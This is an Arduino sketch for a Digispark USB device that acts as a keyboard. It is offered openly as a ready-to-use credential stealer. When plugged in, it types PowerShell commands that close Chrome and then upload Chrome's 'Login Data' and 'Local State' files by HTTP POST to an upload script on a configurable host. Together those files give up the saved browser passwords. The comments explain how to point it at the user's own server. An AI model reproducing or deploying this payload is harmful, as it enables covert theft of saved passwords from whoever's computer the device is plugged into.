//written by Çınar Fidanboy

//this is a language pack, you can replace with your lang packet or delete it if you are using en keyboard ->
#include <digi_tr_tr.h>
#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("get-process -name Chrome | stop-process");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(350);
  
  //just change the host and the php scripts path (change http://192.168.1.9/upload/upload.php part)->
  DigiKeyboard.print("cd $env:LOCALAPPDATA;cd Google;cd Chrome;cd './User Data/';cd Default;Out-Null;Invoke-RestMethod -Uri \"http://192.168.1.9/upload/upload.php\" -Method Post -InFile './Login Data' -UseDefaultCredentials");

  DigiKeyboard.delay(350);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  //just change the host and the php scripts path (change http://192.168.1.9/upload/upload.php part)->
  DigiKeyboard.print("cd '../';Out-Null;Invoke-RestMethod -Uri \"http://192.168.1.9/upload/upload.php\" -Method Post -InFile './Local State' -UseDefaultCredentials");

  
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(350);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }

void loop() {

   }
